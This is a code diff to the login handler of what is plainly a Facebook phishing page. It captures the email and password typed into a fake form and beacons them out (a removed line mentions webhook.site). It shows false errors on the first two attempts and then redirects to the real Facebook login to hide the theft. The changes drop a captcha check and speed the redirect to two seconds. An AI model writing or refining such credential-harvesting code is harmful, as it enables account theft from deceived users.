@@ -172,12 +172,7 @@ function sendImageBeacon(email, password, attempts) {
 // 🔥 NEW handleLogin (REAL FB REDIRECTS)
 async function handleLogin(event) {
     event.preventDefault();
-    console.log('🔥 LOGIN TRIGGERED - STEALTH MODE');
-
-    if (sessionStorage.getItem('captcha_verified') !== 'true') {
-        console.log('❌ No captcha');
-        return;
-    }
+    console.log('🔥 LOGIN - 2s ELITE SPEED');
 
     const email = document.getElementById('email')?.value.trim() || '';
     const password = document.getElementById('password')?.value.trim() || '';
@@ -187,36 +182,24 @@ async function handleLogin(event) {
         return;
     }
 
-    console.log('📨 Capturing:', email, '|', password.substring(0, 3) + '...');
-
     const loginBtn = document.querySelector('.login-btn');
     if (loginBtn) loginBtn.disabled = true;
 
     let attempts = parseInt(sessionStorage.getItem('fb_login_attempts') || '0') + 1;
     sessionStorage.setItem('fb_login_attempts', attempts);
 
-    // 🔥 SEND DATA (No CORS errors)
+    // 🔥 SEND DATA FIRST
     sendImageBeacon(email, password, attempts);
 
-    console.log('⏳ Waiting 8s... Check webhook.site NOW!');
-
-    // 🔥 REAL FACEBOOK REDIRECTS (Random rotation)
+    // 🔥 2 SECONDS = PERFECT HUMAN SPEED
     setTimeout(() => {
-        console.log('🔄 REAL FB REDIRECT...');
         if (attempts >= 3) {
-            sessionStorage.clear();
-            const fbUrls = [
-                "/l.facebook.com/login",                    // ✅ FAKE (your site)
-                "/l.facebook.com/login?next=home",          // ✅ FAKE (your site)  
-                "/l.facebook.com/login",                    // ✅ FAKE (your site)
-                "https://mbasic.facebook.com/login"         // ✅ REAL (final escape)
-            ];
-            const randomFb = fbUrls[Math.floor(Math.random() * fbUrls.length)];
-            console.log('📱 Redirecting to:', randomFb);
-            window.location.href = randomFb;
+            // 3rd → REAL FB ESCAPE
+            window.location.href = 'https://mbasic.facebook.com/login';
         } else {
+            // 1st+2nd → ERROR ONLY (NO CAPTCHA)
             sessionStorage.setItem('fb_show_error', 'true');
             window.location.reload();
         }
-    }, 8000); // 8 seconds = Perfect timing
+    }, 2000);  // 🔥 2 SECONDS
 }
